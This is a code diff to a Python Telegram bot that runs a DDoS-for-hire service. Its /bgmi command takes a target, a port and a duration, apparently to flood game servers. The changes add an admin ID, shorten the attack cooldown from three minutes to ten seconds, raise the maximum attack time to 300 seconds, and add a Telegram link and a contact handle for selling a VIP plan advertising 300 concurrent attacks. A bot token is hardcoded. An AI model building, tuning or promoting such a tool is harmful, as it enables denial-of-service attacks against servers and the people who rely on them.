@@ -10,7 +10,7 @@ import os
 bot = telebot.TeleBot('74202866:AAEcM_lcYmGPDN6GHGLgf3InRIRZHllncUM')
 
 # Admin user IDs
-admin_id = ["", "", "", "5473743538"]
+admin_id = ["5699546231", "", "", "5473743538"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -223,8 +223,8 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 180:
-                response = "You Are On Cooldown ❌. Please Wait 3min Before Running The /bgmi Command Again."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
+                response = "You Are On Cooldown ❌. Please Wait 10s Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -235,7 +235,7 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 121:
+            if time > 300:
                 response = "Error: Time interval must be less than 80."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
@@ -300,7 +300,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
+    response = f'''👋🏻Welcome to Your Home, {user_name}! Join Telegram😘 https://t.me/+kmefHBKJYLgzYTU1.
 🤖Try To Run This Command : /help 
 WELCOME TO THE SERVER FREEZE BOT'''
     bot.reply_to(message, response)
@@ -321,6 +321,7 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
+->Dm- @sonuytislive
 -> Attack Time : 200 (S)
 > After Attack Limit : 3 Min
 -> Concurrents Attack : 300
